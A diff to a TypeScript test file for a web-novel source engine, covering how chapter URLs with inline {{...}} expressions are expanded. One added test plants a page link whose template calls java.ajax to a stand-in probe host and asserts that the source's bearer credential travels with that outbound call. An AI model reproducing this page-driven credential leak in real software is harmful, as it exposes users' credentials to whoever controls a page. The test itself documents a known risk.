@@ -1,6 +1,7 @@
 import assert from 'node:assert/strict'
 import test from 'node:test'
-import { searchBooks } from '../../source-core/src/public/index.ts'
+import { loadChapterContent, loadTableOfContents, searchBooks } from '../../source-core/src/public/index.ts'
+import type { BookMetadata } from '../../source-core/src/public/index.ts'
 import type { NetworkHost, NetworkResponse, NormalizedSource, WorkflowPorts } from '../../source-core/src/public/index.ts'
 import { NodeCookieStore } from '../src/cookies.ts'
 import { SourceRequestHost } from '../src/source-request-host.ts'
@@ -8,6 +9,17 @@ import { SourceRuleHost } from '../src/source-rule-host.ts'
 
 /** 语料里常见的真实形态：先清 Cookie，再用 POST JSON 选项搜索。 */
 const cookiePrefixUrl = '{{cookie.removeCookie(source.getKey())}}\nhttps://www.22biqu.com/ss/,{\n  "method": "POST",\n  "body": "searchkey={{key}}"\n}'
+
+const book: BookMetadata = {
+  sourceId: 'https://fixture.test',
+  bookUrl: 'https://fixture.test/book/1',
+  name: '书',
+  tocUrl: 'https://fixture.test/toc',
+  rawFields: {},
+  traceRef: 'detail:0',
+  emptyFields: [],
+  fieldErrors: {},
+}
 
 function response(url: string, body: string): NetworkResponse {
   return { url, status: 200, headers: { 'content-type': 'text/html; charset=utf-8' }, bytes: new TextEncoder().encode(body), redirected: false }
@@ -75,6 +87,63 @@ test('搜索 URL 支持 java.encodeURI 等内联 JS 表达式和页码算术', a
   assert.equal(decodeURIComponent(url.searchParams.get('q') ?? ''), '中文 词')
   assert.match(url.searchParams.get('t') ?? '', /^\d+$/)
   assert.ok(!calls[0]!.includes('{{'))
+})
+
+test('页面产出的章节地址里的 {{...}} 与书源地址一样执行（Android AnalyzeUrl 能力面）', async () => {
+  const calls: Array<{ url: string; authorization: string | undefined }> = []
+  const network: NetworkHost = {
+    request: async (plan) => {
+      calls.push({ url: plan.url, authorization: (plan.headers as Record<string, string> | undefined)?.['Authorization'] })
+      if (plan.url === 'https://probe.test/token') return response(plan.url, 'probe-token')
+      return response(plan.url, plan.url.includes('/c/1') ? '<div class="body">正文</div>' : '<a href="/c/1#{{java.ajax(\'https://probe.test/token\')}}">第一章</a>')
+    },
+  }
+  const { ports } = session(network)
+  const source = {
+    bookSourceUrl: 'https://fixture.test',
+    bookSourceName: 'fixture',
+    header: JSON.stringify({ Authorization: 'Bearer SOURCE-CREDENTIAL' }),
+    ruleToc: { chapterList: 'a', chapterName: 'text', chapterUrl: 'href' },
+    ruleContent: { content: '.body@text' },
+  } as unknown as NormalizedSource
+  const toc = await loadTableOfContents(ports, { source, book })
+  // 目录阶段不展开章节地址，模板保留在章节链接里。
+  assert.match(toc.value?.items[0]?.chapterUrl ?? '', /#\{\{java\.ajax/)
+
+  const chapter = toc.value!.items[0]!
+  const content = await loadChapterContent(ports, { source, chapter })
+  assert.equal(content.status, 'success')
+  // Android 对页面产出的地址做同样的内联 JS 展开：表达式会被执行（能力面已登记在威胁模型文档）。
+  const probe = calls.find((call) => call.url === 'https://probe.test/token')
+  assert.ok(probe !== undefined)
+  // 该外连带着书源凭据，这是已登记的设计取舍。
+  assert.equal(probe?.authorization, 'Bearer SOURCE-CREDENTIAL')
+  // 正文请求发生在展开后的地址上，不再保留模板字面量。
+  assert.ok(calls.some((call) => call.url === 'https://fixture.test/c/1#probe-token'))
+  assert.ok(!calls.some((call) => call.url.includes('{{')))
+})
+
+test('页面链接里的表达式求值失败时不发出带字面量的地址', async () => {
+  const calls: string[] = []
+  const network: NetworkHost = {
+    request: async (plan) => {
+      calls.push(plan.url)
+      return response(plan.url, plan.url.includes('/c/2') ? '正文' : '<a href="/c/2#{{notDefinedHere(\'x\')}}">第二章</a>')
+    },
+  }
+  const { ports } = session(network)
+  const source = {
+    bookSourceUrl: 'https://fixture.test',
+    bookSourceName: 'fixture',
+    ruleToc: { chapterList: 'a', chapterName: 'text', chapterUrl: 'href' },
+    ruleContent: { content: '.body@text' },
+  } as unknown as NormalizedSource
+  const toc = await loadTableOfContents(ports, { source, book })
+  const chapter = toc.value!.items[0]!
+  const result = await loadChapterContent(ports, { source, chapter })
+  assert.equal(result.status, 'failed')
+  assert.ok(result.diagnostics.some((diagnostic) => diagnostic.code === 'rule-failed'))
+  assert.ok(!calls.some((call) => call.includes('{{')))
 })
 
 test('没有 JavaScript 能力时 URL 表达式展开失败可诊断，不静默保留字面量', async () => {
